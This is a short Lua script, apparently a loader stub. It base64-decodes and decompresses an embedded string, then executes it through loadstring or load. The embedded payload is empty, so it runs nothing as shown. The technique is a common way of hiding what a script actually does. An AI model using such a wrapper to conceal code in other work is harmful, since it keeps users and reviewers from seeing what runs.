local b64=[[]]
local f=(loadstring or load)((function(b64)local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' local map={} for i=1,#b do map[b:sub(i,i)]=i-1 end local tmp={} local val,bit=0,0 for i=1,#b64 do local c=b64:sub(i,i) if c=='=' then break end local v=map[c] if v then val=val*64+v bit=bit+6 while bit>=8 do bit=bit-8 local p=2^bit local by=math.floor(val/p) tmp[#tmp+1]=string.char(by) val=val-by*p end end end local comp=table.concat(tmp) local n=#comp local idx=1 local out={} local byte=string.byte while idx<=n do local flags=byte(comp,idx); idx=idx+1 for bit=0,7 do if idx>n then break end if flags % (2^(bit+1)) >= 2^bit then out[#out+1]=string.char(byte(comp,idx)); idx=idx+1 else if idx+1>n then break end local hi,lo=byte(comp,idx),byte(comp,idx+1); idx=idx+2 local off=hi*16+math.floor(lo/16)+1 local L=lo%16+3 local src=#out-off+1 for k=0,L-1 do out[#out+1]=out[src+k] end end end end return table.concat(out) end)(b64)) if type(f)=='function' then f() end